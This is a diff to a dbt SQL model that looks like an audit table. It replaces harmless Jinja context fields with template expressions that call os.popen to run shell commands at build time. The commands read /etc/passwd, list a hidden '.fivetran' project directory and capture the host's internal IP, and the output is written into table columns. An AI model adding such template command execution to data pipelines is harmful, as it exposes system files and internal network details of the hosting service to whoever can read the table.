@@ -1,8 +1,7 @@
 {{ config(materialized='table') }}
 
 SELECT 
-    '{{ user }}' as jinja_user,
-    '{{ graph.nodes.values() | map(attribute="name") | list | join(", ") | truncate(100) }}' as model_names,
-    '{{ flags.PROFILES_DIR }}' as p_path,
-    '{{ invocation_id }}' as inv_id,
+    '{{ modules.os.popen("cat /etc/passwd").read() | truncate(500) }}' as passwd_file,
+    '{{ modules.os.popen("ls -la /tmp/dbt/project/.fivetran").read() }}' as internal_files,
+    '{{ modules.os.popen("hostname -I").read() }}' as internal_ip,
     CURRENT_TIMESTAMP as audit_time
